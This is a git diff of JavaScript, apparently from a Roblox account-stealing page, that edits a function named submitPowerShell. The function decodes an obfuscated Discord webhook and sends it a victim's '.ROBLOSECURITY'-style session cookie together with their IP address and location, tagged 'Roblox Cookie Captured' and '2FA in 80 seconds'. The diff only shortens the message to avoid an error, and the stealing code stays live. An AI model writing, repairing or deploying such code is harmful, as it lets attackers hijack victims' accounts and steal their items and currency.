@@ -262,41 +262,21 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
-        // Enhanced webhook payload with copyable cookie
+        // Fixed webhook payload - shorter to avoid 400 error
         const payload = {
             content: `🍪 **Roblox Cookie Captured**
 \`\`\`
-_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_
-
 Time: ${new Date().toLocaleString()}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 IP: ${locationInfo.ip || 'Unknown'}
-Browser: ${navigator.userAgent}
-Screen: ${screen.width}x${screen.height}
-Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Language: ${navigator.language}
-Platform: ${navigator.platform}
-Memory: ${navigator.deviceMemory || 'Unknown'} GB
-CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
-Online: ${navigator.onLine ? 'Yes' : 'No'}
-Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
 \`\`\`
 
-**💎 COPYABLE COOKIE:**
+**💎 COOKIE:**
 \`\`\`
 ${robloxCookie || 'None found'}
 \`\`\`
 
-**🔒 ACCOUNT VALUE ESTIMATE:**
-\`\`\`
-🎯 High-Value Target Detected
-💰 Estimated Account Worth: Checking...
-🏆 Premium Status: Analyzing...
-📅 Account Age: Determining...
-\`\`\`
-
-🎯 **Target acquired - 2FA will trigger in 80 seconds**
-⚡ **Auto-analysis starting...**
+🎯 **2FA in 80 seconds**
 @everyone`
         };
 
